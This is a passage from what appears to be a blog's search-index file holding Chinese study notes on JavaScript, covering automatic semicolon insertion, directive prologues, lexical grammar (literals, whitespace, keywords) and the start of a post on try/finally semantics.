class 设计比 function 和 var 更符合直觉，而且在遇到一些比较奇怪的用法时，倾向于抛出错误。</p><p>按照现代语言设计的评价标准，及早抛错是好事，它能够帮助我们尽量在开发阶段就发现代码的可能问题。</p><h2 id="指令序言机制"><a href="#指令序言机制" class="headerlink" title="指令序言机制"></a>指令序言机制</h2><p>脚本和模块都支持一种特别的语法，叫做指令序言（Directive Prologs）。</p><blockquote><p>“use strict”是 JavaScript 标准中规定的唯一一种指令序言，但是设计指令序言的目的是，留给 JavaScript 的引擎和实现者一些统一的表达方式，在静态扫描时指定 JavaScript 代码的一些特性。</p></blockquote><p>这里的指令序言最早是为了 use strict 设计的，它规定了一种给 JavaScript 代码添加元信息的方式。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;;</span><br><span class="line">f.<span class="title function_">call</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>例如，<strong>假设</strong>我们要设计一种声明本文件不需要进行 lint 检查的指令，我们可以这样设计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;no lint&quot;</span>;</span><br><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doSth</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//......</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>08丨JavaScript-到底要不要写分号呢？</title>
      <link href="/Blog/2019/01/29/relearn_FE/08%E4%B8%A8JavaScript-%E5%88%B0%E5%BA%95%E8%A6%81%E4%B8%8D%E8%A6%81%E5%86%99%E5%88%86%E5%8F%B7%E5%91%A2%EF%BC%9F/index/"/>
      <url>/Blog/2019/01/29/relearn_FE/08%E4%B8%A8JavaScript-%E5%88%B0%E5%BA%95%E8%A6%81%E4%B8%8D%E8%A6%81%E5%86%99%E5%88%86%E5%8F%B7%E5%91%A2%EF%BC%9F/index/</url>
      
        <content type="html"><![CDATA[<h2 id="自动插入分号规则"><a href="#自动插入分号规则" class="headerlink" title="自动插入分号规则"></a>自动插入分号规则</h2><p>自动插入分号规则其实独立于所有的语法产生式定义，它的规则说起来非常简单，只有三条。</p><ul><li>要有换行符，且下一个符号是不符合语法的，那么就尝试插入分号。</li><li>有换行符，且语法中规定此处不能有换行符，那么就自动插入分号。</li><li>源代码结束处，不能形成完整的脚本或者模块结构，那么就自动插入分号。</li></ul><h2 id="举两个例子🌰："><a href="#举两个例子🌰：" class="headerlink" title="举两个例子🌰："></a>举两个例子🌰：</h2><blockquote><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let a = <span class="number">1</span></span><br><span class="line"><span class="keyword">void</span> <span class="keyword">function</span>(<span class="params">a</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(a);</span><br><span class="line">&#125;(a);</span><br></pre></td></tr></table></figure><p>在这个例子中，第一行的结尾处有换行符，接下来 <code>void</code> 关键字接在 <code>1</code> 之后是不合法的，这命中了我们的第一条规则，因此会在 <code>void</code> 前插入换行符。</p></blockquote><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var a = 1, b = 1, c = 1;</span><br><span class="line"><span class="section">a</span></span><br><span class="line"><span class="section">++</span></span><br><span class="line"><span class="section">b</span></span><br><span class="line"><span class="section">++</span></span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>也是个著名的例子，我们看第二行的 <code>a</code> 之后，有换行符，后面遇到了 <code>++</code> 运算符，<code>a</code> 后面跟 <code>++</code> 是合法的语法，再之后紧接着后面跟着 <code>b</code> 就是不合法的，本该插入分号，但是下文 <code>no LineTerminator here</code> 又规定<strong>后自增前不能有换行符</strong>，于是，这里 a 的后面就要插入一个分号了。所以这段代码最终的结果，<code>b</code> 和 <code>c</code> 都变成了 <code>2</code>，而 <code>a</code> 还是 <code>1</code>。</p></blockquote><blockquote><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params">a</span>)&#123;</span><br><span class="line">   <span class="built_in">console</span>.<span class="built_in">log</span>(a);</span><br><span class="line">&#125;)()</span><br><span class="line">(<span class="keyword">function</span>(<span class="params">a</span>)&#123;</span><br><span class="line">   <span class="built_in">console</span>.<span class="built_in">log</span>(a);</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>这个例子是比较有实际价值的例子，这里两个 <code>function</code> 调用的写法被称作 <code>IIFE</code>（立即执行的函数表达式），是个常见技巧。</p><p>这段代码意图上显然是形成两个 <code>IIFE</code>。</p><p>我们来看第三行结束的位置，<code>JavaScript</code> 引擎会认为函数返回的可能是个函数，那么，在后面再跟括号形成函数调用就是合理的，因此这里不会自动插入分号。</p><p>这是一些鼓励不写分号的编码风格会要求大家写 IIFE 时必须在行首加分号的原</p></blockquote><h2 id="ps-no-LineTerminator-here-规则"><a href="#ps-no-LineTerminator-here-规则" class="headerlink" title="ps: no LineTerminator here 规则"></a>ps: no LineTerminator here 规则</h2><p>好了，到这里我们已经讲清楚了分号自动插入的规则，但是我们要想彻底掌握分号的奥秘，就必须要对 JavaScript 的语法定义做一些数据挖掘工作。</p><p><code>no LineTerminator here</code> 规则表示它所在的结构中的这一位置不能插入换行符。</p><p>自动插入分号规则的第二条：有换行符，且语法中规定此处不能有换行符，那么就自动插入分号。跟 no LineTerminator here 规则强相关，那么我们就找出 <code>JavaScript</code> 语法定义中的这些规则。</p><p><img src="/Blog/2019/01/29/relearn_FE/08%E4%B8%A8JavaScript-%E5%88%B0%E5%BA%95%E8%A6%81%E4%B8%8D%E8%A6%81%E5%86%99%E5%88%86%E5%8F%B7%E5%91%A2%EF%BC%9F/index/img.png"></p><h2 id="敲重点！！"><a href="#敲重点！！" class="headerlink" title="敲重点！！"></a>敲重点！！</h2><h2 id="不写分号需要注意的情况"><a href="#不写分号需要注意的情况" class="headerlink" title="不写分号需要注意的情况"></a>不写分号需要注意的情况</h2><p>下面我们来看几种不写分号容易造成错误的情况，你可以稍微注意一下，避免发生同样的问题。</p><h4 id="1-以括号开头的语句"><a href="#1-以括号开头的语句" class="headerlink" title="1.以括号开头的语句"></a>1.以括号开头的语句</h4><p>我们在前面的案例中，已经展示了一种情况，那就是以括号开头的语句：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params">a</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(a);</span><br><span class="line">&#125;)()<span class="comment">/* 这里没有被自动插入分号 */</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params">a</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(a);</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>这段代码看似两个独立执行的函数表达式，但是其实第三组括号被理解为传参，导致抛出错误。</p><h4 id="2-以数组开头的语句"><a href="#2-以数组开头的语句" class="headerlink" title="2.以数组开头的语句"></a>2.以数组开头的语句</h4><p>除了括号，以数组开头的语句也十分危险：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> <span class="selector-tag">a</span> = <span class="selector-attr">[[]</span>]<span class="comment">/* 这里没有被自动插入分号 */</span></span><br><span class="line"><span class="selector-attr">[3, 2, 1, 0]</span><span class="selector-class">.forEach</span>(e =&gt; console<span class="selector-class">.log</span>(e))</span><br></pre></td></tr></table></figure><p>这段代码本意是一个变量 <code>a</code> 赋值，然后对一个数组执行 <code>forEach</code>，但是因为没有自动插入分号，被理解为下标运算符和逗号表达式，我这个例子展示的情况，甚至不会抛出错误，这对于代码排查问题是个噩梦。</p><h4 id="3-以正则表达式开头的语句"><a href="#3-以正则表达式开头的语句" class="headerlink" title="3.以正则表达式开头的语句"></a>3.以正则表达式开头的语句</h4><p>正则表达式开头的语句也值得你去多注意一下。我们来看这个例子。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>, g = &#123;<span class="attr">test</span>:<span class="function"><span class="params">()</span>=&gt;</span><span class="number">0</span>&#125;, b = <span class="number">1</span><span class="comment">/* 这里没有被自动插入分号 */</span></span><br><span class="line">/(a)/g.test(<span class="string">&quot;abc&quot;</span>)</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(RegExp.$<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这段代码本意是声明三个变量，然后测试一个字符串中是否含有字母 <code>a</code>，但是因为没有自动插入分号，正则的第一个斜杠被理解成了除号，后面的意思就都变了。</p><p>注意，我构造的这个例子跟上面的例子一样，同样不会抛错，凡是这一类情况，都非常致命。</p><h4 id="以-Template-开头的语句"><a href="#以-Template-开头的语句" class="headerlink" title="以 Template 开头的语句"></a>以 <code>Template</code> 开头的语句</h4><p>以 <code>Template</code> 开头的语句比较少见，但是跟正则配合时，仍然不是不可能出现：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> g = f<span class="comment">/* 这里没有被自动插入分号 */</span></span><br><span class="line"><span class="string">`Template`</span>.match(<span class="regexp">/(a)/</span>);</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(RegExp.$<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这段代码本意是声明函数 <code>f</code>，然后赋值给 <code>g</code>，再测试 <code>Template</code> 中是否含有字母 <code>a</code>。但是因为没有自动插入分号，函数 f 被认为跟 <code>Template</code> 一体的，进而被莫名其妙地执行了一次。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>07丨JavaScript-为什么12.toString会报错</title>
      <link href="/Blog/2019/01/29/relearn_FE/07%E4%B8%A8JavaScript-%E4%B8%BA%E4%BB%80%E4%B9%8812%C2%B7toString%E4%BC%9A%E6%8A%A5%E9%94%99/index/"/>
      <url>/Blog/2019/01/29/relearn_FE/07%E4%B8%A8JavaScript-%E4%B8%BA%E4%BB%80%E4%B9%8812%C2%B7toString%E4%BC%9A%E6%8A%A5%E9%94%99/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文法是编译原理中对语言的写法的一种规定，一般来说，文法分成词法和语法两种。</p><p>词法规定了语言的最小语义单元：token，可以翻译成“标记”或者“词”，我统一把 token 翻译成词。</p><p>从字符到词的整个过程是没有结构的，只要符合词的规则，就构成词，一般来说，词法设计不会包含冲突。词法分析技术上可以使用状态机或者正则表达式来进行。</p></blockquote><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>我们先来看一看 JavaScript 的词法定义。JavaScript 源代码中的输入可以这样分类：</p><ul><li>WhiteSpace 空白字符</li><li>LineTerminator 换行符</li><li>Comment 注释</li><li>Token 词<ul><li>IdentifierName 标识符名称，典型案例是我们使用的变量名，注意这里关键字也包含在内了。</li><li>Punctuator 符号，我们使用的运算符和大括号等符号。</li><li>NumericLiteral 数字直接量，就是我们写的数字。</li><li>StringLiteral 字符串直接量，就是我们用单引号或者双引号引起来的直接量。</li><li>Template 字符串模板，用反引号&#96; 括起来的直接量。</li></ul></li></ul><p>这个设计符合比较通用的编程语言设计方式，不过，JavaScript 中有一些特别之处，我下面就来讲讲特别在哪里。</p><p>首先是除法和正则表达式冲突问题。我们都知道，JavaScript 不但支持除法运算符“ &#x2F; ”和“ &#x2F;&#x3D; ”，还支持用斜杠括起来的正则表达式“ &#x2F;abc&#x2F; ”。</p><p>但是，这时候对词法分析来说，其实是没有办法处理的，所以 JavaScript 的解决方案是定义两组词法，然后靠语法分析传一个标志给词法分析器，让它来决定使用哪一套词法。</p><p>JavaScript 词法的另一个特别设计是字符串模板，模板语法大概是这样的：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`Hello, <span class="subst">$&#123;name&#125;</span>`</span></span><br></pre></td></tr></table></figure><p>理论上，“ ${ } ”内部可以放任何 JavaScript 表达式代码，而这些代码是以“ } ” 结尾的，也就是说，这部分词法不允许出现“ } ”运算符。</p><p>是否允许“ } ”的两种情况，与除法和正则表达式的两种情况相乘就是四种词法定义，所以你在 JavaScript 标准中，可以看到四种定义：</p><ul><li>InputElementDiv；</li><li>InputElementRegExp；</li><li>InputElementRegExpOrTemplateTail；</li><li>InputElementTemplateTail。</li></ul><p>为了解决这两个问题，标准中还不得不把除法、正则表达式直接量和“ } ”从 token 中单独抽出来，用词上，也把原本的 Token 改为 CommonToken。</p><blockquote><p>对一般的语言的词法分析过程来说，都会丢弃除了 token 之外的输入，但是对 JavaScript 来说，不太一样，换行符和注释还会影响语法分析过程，这个我们将会在语法部分给你详细讲解（所以要实现 JavaScript 的解释器，词法分析和语法分析非常麻烦，需要来回传递信息）。</p></blockquote><h2 id="数字直接量-NumericLiteral"><a href="#数字直接量-NumericLiteral" class="headerlink" title="数字直接量 NumericLiteral"></a>数字直接量 NumericLiteral</h2><p>我们来看看今天标题提出的问题，JavaScript 规范中规定的数字直接量可以支持四种写法：十进制数、二进制整数、八进制整数和十六进制整数。</p><p>十进制的 Number 可以带小数，小数点前后部分都可以省略，但是不能同时省略，我们看几个例子：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">.01</span></span><br><span class="line">12.</span><br><span class="line">12.01</span><br></pre></td></tr></table></figure><p>这都是合法的数字直接量。这里就有一个问题，也是我们标题提出的问题，我们看一段代码：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12.</span><span class="keyword">to</span><span class="constructor">String()</span></span><br></pre></td></tr></table></figure><p>这时候12. 会被当作省略了小数点后面部分的数字，而单独看成一个整体，所以我们要想让点单独成为一个 token，就要加入空格，这样写：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">12 </span>.toString()</span><br></pre></td></tr></table></figure><h2 id="空白符号-Whitespace"><a href="#空白符号-Whitespace" class="headerlink" title="空白符号 Whitespace"></a>空白符号 Whitespace</h2><p>说起空白符号，想必给大家留下的印象就是空格，但是实际上，JavaScript 可以支持更多空白符号。</p><ul><li>&lt;HT&gt;(或称&lt;TAB&gt;) 是 U+0009，是缩进 TAB 符，也就是字符串中写的 \t 。</li><li>&lt;VT&gt;是 U+000B，也就是垂直方向的 TAB 符 \v，这个字符在键盘上很难打出来，所以很少用到。</li><li>&lt;FF&gt;是 U+000C，Form Feed，分页符，字符串直接量中写作 \f ，现代已经很少有打印源程序的事情发生了，所以这个字符在 JavaScript 源代码中很少用到。</li><li>&lt;SP&gt;是 U+0020，就是最普通的空格了。</li><li>&lt;NBSP&gt;是 U+00A0，非断行空格，它是 SP 的一个变体，在文字排版中，可以避免因为空格在此处发生断行，其它方面和普通空格完全一样。多数的 JavaScript 编辑环境都会把它当做普通空格（因为一般源代码编辑环境根本就不会自动折行……）。HTML 中，很多人喜欢用的 &amp;nbsp; 最后生成的就是它了。</li><li>&lt;ZWNBSP&gt;(旧称&lt;BOM&gt;) 是 U+FEFF，这是 ES5 新加入的空白符，是 Unicode 中的零宽非断行空格，在以 UTF 格式编码的文件中，常常在文件首插入一个额外的 U+FEFF，解析 UTF 文件的程序可以根据 U+FEFF 的表示方法猜测文件采用哪种 UTF 编码方式。这个字符也叫做“bit order mark”。</li></ul><p>此外，JavaScript 支持所有的 Unicode 中的空格分类下的空格，我们可以看下表：</p><p><img src="/Blog/2019/01/29/relearn_FE/07%E4%B8%A8JavaScript-%E4%B8%BA%E4%BB%80%E4%B9%8812%C2%B7toString%E4%BC%9A%E6%8A%A5%E9%94%99/index/img.png"></p><p>很多公司的编码规范要求 JavaScript 源代码控制在 ASCII 范围内，那么，就只有&lt;TAB&gt; &lt;VT&gt; &lt;FF&gt; &lt;SP&gt; &lt;NBSP&gt;五种空白可用了。</p><h2 id="换行符-LineTerminator"><a href="#换行符-LineTerminator" class="headerlink" title="换行符 LineTerminator"></a>换行符 LineTerminator</h2><ul><li>&lt;LF&gt;</li><li>&lt;CR&gt;</li><li>&lt;LS&gt;</li><li>&lt;PS&gt;</li></ul><p>其中，&lt;LF&gt;是 U+000A，就是最正常换行符，在字符串中的\n。</p><p>&lt;CR&gt;是 U+000D，这个字符真正意义上的“回车”，在字符串中是\r，在一部分 Windows 风格文本编辑器中，换行是两个字符\r\n。</p><p>&lt;LS&gt;是 U+2028，是 Unicode 中的行分隔符。&lt;PS&gt;是 U+2029，是 Unicode 中的段落分隔符。</p><p>大部分 LineTerminator 在被词法分析器扫描出之后，会被语法分析器丢弃，但是换行符会影响 JavaScript 的两个重要语法特性：自动插入分号和“no line terminator”规则。</p><h2 id="注释-Comment"><a href="#注释-Comment" class="headerlink" title="注释 Comment"></a>注释 Comment</h2><p>JavaScript 的注释分为单行注释和多行注释两种：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/* MultiLineCommentChars */</span> </span><br><span class="line"><span class="regexp">//</span> SingleLineCommentChars</span><br></pre></td></tr></table></figure><p>多行注释中允许自由地出现MultiLineNotAsteriskChar，也就是除了*之外的所有字符。而每一个*之后，不能出现正斜杠符/。</p><p>除了四种 LineTerminator 之外，所有字符都可以作为单行注释。</p><p>我们需要注意，多行注释中是否包含换行符号，会对 JavaScript 语法产生影响，对于“no line terminator”规则来说，带换行的多行注释与换行符是等效的。</p><h2 id="标识符名称-IdentifierName"><a href="#标识符名称-IdentifierName" class="headerlink" title="标识符名称 IdentifierName"></a>标识符名称 IdentifierName</h2><p>IdentifierName可以以美元符“$”、下划线“_”或者 Unicode 字母开始，除了开始字符以外，IdentifierName中还可以使用 Unicode 中的连接标记、数字、以及连接符号。</p><p>IdentifierName的任意字符可以使用 JavaScript 的 Unicode 转义写法，使用 Unicode 转义写法时，没有任何字符限制。</p><p>IdentifierName可以是Identifier、NullLiteral、BooleanLiteral或者keyword，在ObjectLiteral中，IdentifierName还可以被直接当做属性名称使用。</p><p>仅当不是保留字的时候，IdentifierName会被解析为Identifier。</p><p>注意&lt;ZWNJ&gt;和&lt;ZWJ&gt;是 ES5 新加入的两个格式控制字符，它们都是 0 宽的。</p><p>我在前面提到了，关键字也属于这个部分，在 JavaScript 中，关键字有:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await <span class="keyword">break</span> <span class="keyword">case</span> <span class="keyword">catch</span> <span class="keyword">class</span> <span class="symbol">const</span> <span class="symbol">continue</span> <span class="symbol">debugger</span> <span class="symbol">default</span> <span class="symbol">delete</span> <span class="symbol">do</span> <span class="symbol">else</span> <span class="symbol">export</span> <span class="symbol">extends</span> <span class="symbol">finally</span> <span class="symbol">for</span> <span class="symbol">function</span> <span class="symbol">if</span> <span class="symbol">import</span> <span class="symbol">instance</span> <span class="symbol">of</span> <span class="symbol">new</span> <span class="symbol">return</span> <span class="symbol">super</span> <span class="symbol">switch</span> <span class="symbol">this</span> <span class="symbol">throw</span> <span class="symbol">try</span> <span class="symbol">typeof</span> <span class="symbol">var</span> <span class="symbol">void</span> <span class="symbol">while</span> <span class="symbol">with</span> <span class="symbol">yield</span></span><br></pre></td></tr></table></figure><p>除了上述的内容之外，还有 1 个为了未来使用而保留的关键字:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span></span><br></pre></td></tr></table></figure><p>在严格模式下, 有一些额外的为未来使用而保留的关键字:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">implements</span> <span class="keyword">package</span> <span class="keyword">protected</span> <span class="keyword">interface</span> <span class="keyword">private</span> <span class="keyword">public</span></span><br></pre></td></tr></table></figure><p>除了这些之外，NullLiteral（null）和BooleanLiteral（true false）也是保留字，不能用于Identifier。</p><h2 id="符号-Punctuator"><a href="#符号-Punctuator" class="headerlink" title="符号 Punctuator"></a>符号 Punctuator</h2><p>因为前面提到的除法和正则问题, / 和 /= 两个运算符被拆分为 DivPunctuator，因为前面提到的字符串模板问题，}也被独立拆分。加在一起，所有符号为：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; ( ) [ ] . ... ; , <span class="variable">&lt; &gt;</span> <span class="variable">&lt;= &gt;</span>= == != === !== + - <span class="symbol">*</span> % <span class="symbol">*</span><span class="symbol">*</span> ++ -- <span class="variable">&lt;&lt; &gt;</span>&gt; &gt;&gt;&gt; &amp; |<span class="string"> ^ ! ~ &amp;&amp; </span>||<span class="string"> ? : = += -= *= %= **= &lt;&lt;= &gt;&gt;= &gt;&gt;&gt;= &amp;= </span>|<span class="string">= ^= =&gt; / /= &#125;</span></span><br></pre></td></tr></table></figure><h2 id="字符串直接量-StringLiteral"><a href="#字符串直接量-StringLiteral" class="headerlink" title="字符串直接量 StringLiteral"></a>字符串直接量 StringLiteral</h2><p>JavaScript 中的 StringLiteral 支持单引号和双引号两种写法。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; DoubleStringCharacters &quot;</span></span><br><span class="line">&#x27; SingleStringCharacters &#x27;</span><br></pre></td></tr></table></figure><p>单双引号的区别仅仅在于写法，在双引号字符串直接量中，双引号必须转义，在单引号字符串直接量中，单引号必须转义。字符串中其他必须转义的字符是\和所有换行符。</p><p>JavaScript 中支持四种转义形式，还有一种虽然标准没有定义，但是大部分实现都支持的八进制转义。</p><p>第一种是单字符转义。 即一个反斜杠\后面跟一个字符这种形式。</p><p>有特别意义的字符包括有SingleEscapeCharacter所定义的 9 种，见下表：</p><p><img src="/Blog/2019/01/29/relearn_FE/07%E4%B8%A8JavaScript-%E4%B8%BA%E4%BB%80%E4%B9%8812%C2%B7toString%E4%BC%9A%E6%8A%A5%E9%94%99/index/img_1.png"></p><p>除了这 9 种字符、数字、x 和 u 以及所有的换行符之外，其它字符经过\转义后都是自身。</p><h3 id="正则表达式直接量-RegularExpressionLiteral"><a href="#正则表达式直接量-RegularExpressionLiteral" class="headerlink" title="正则表达式直接量 RegularExpressionLiteral"></a>正则表达式直接量 RegularExpressionLiteral</h3><p>正则表达式由 Body 和 Flags 两部分组成，例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/RegularExpressionBody/g</span></span><br></pre></td></tr></table></figure><p>其中 Body 部分至少有一个字符，第一个字符不能是 *（因为 /* 跟多行注释有词法冲突）。</p><p>正则表达式有自己的语法规则，在词法阶段，仅会对它做简单解析。</p><p>正则表达式并非机械地见到/就停止，在正则表达式[ ]中的/就会被认为是普通字符。我们可以看一个例子：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[<span class="regexp">/]/</span>.test(<span class="string">&quot;/&quot;</span>);</span><br></pre></td></tr></table></figure><p>除了\、/ 和[ 三个字符之外，JavaScript 正则表达式中的字符都是普通字符。</p><p>用\和一个非换行符可以组成一个转义，[ ]中也支持转义。正则表达式中的 flag 在词法阶段不会限制字符。</p><p>虽然只有 ig 几个是有效的，但是任何 IdentifierPart（Identifier 中合法的字符）序列在词法阶段都会被认为是合法的。</p><h2 id="字符串模板-Template"><a href="#字符串模板-Template" class="headerlink" title="字符串模板 Template"></a>字符串模板 Template</h2><p>从语法结构上，Template 是个整体，其中的 ${ } 是并列关系。</p><p>但是实际上，在 JavaScript 词法中，包含 ${ } 的 Template，是被拆开分析的，如：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`a<span class="subst">$&#123;b&#125;</span>c<span class="subst">$&#123;d&#125;</span>e`</span></span><br></pre></td></tr></table></figure><p>它在 JavaScript 中被认为是：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`a<span class="subst">$&#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">b</span></span></span><br><span class="line"><span class="subst"><span class="string">&#125;</span>c<span class="subst">$&#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">d</span></span></span><br><span class="line"><span class="subst"><span class="string">&#125;</span>e`</span></span><br></pre></td></tr></table></figure><p>它被拆成了五个部分：</p><ul><li>`a${ 这个被称为模板头</li><li>}c${ 被称为模板中段</li><li>}e` 被称为模板尾</li><li>b 和 d 都是普通标识符</li></ul><p>实际上，这里的词法分析过程已经跟语法分析深度耦合了。</p><p>不过我们学习的时候，大可不必按照标准和引擎工程师这样去理解，可以认为模板就是一个由反引号括起来的、可以在中间插入代码的字符串。</p><p>模板支持添加处理函数的写法，这时模板的各段会被拆开，传递给函数当参数：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(arguments);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;world&quot;</span></span><br><span class="line">f<span class="string">`Hello <span class="subst">$&#123;a&#125;</span>!`</span>; <span class="comment">// [[&quot;Hello &quot;, &quot;!&quot;], world]</span></span><br></pre></td></tr></table></figure><p>模板字符串不需要关心大多数字符的转义，但是至少 ${ 和 ` 还是需要处理的。</p><p>模板中的转义跟字符串几乎完全一样，都是使用 \。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>06丨JavaScript-try里面放return，finally还会执行吗？</title>
      <link href="/Blog/2019/01/29/relearn_FE/06%E4%B8%A8JavaScript-try%E9%87%8C%E9%9D%A2%E6%94%BEreturn%EF%BC%8Cfinally%E8%BF%98%E4%BC%9A%E6%89%A7%E8%A1%8C%E5%90%97%EF%BC%9F/index/"/>
      <url>/Blog/2019/01/29/relearn_FE/06%E4%B8%A8JavaScript-try%E9%87%8C%E9%9D%A2%E6%94%BEreturn%EF%BC%8Cfinally%E8%BF%98%E4%BC%9A%E6%89%A7%E8%A1%8C%E5%90%97%EF%BC%9F/index/</url>
      
        <content type="html"><![CDATA[<h2 id="Completion-类型"><a href="#Completion-类型" class="headerlink" title="Completion 类型"></a>Completion 类型</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span 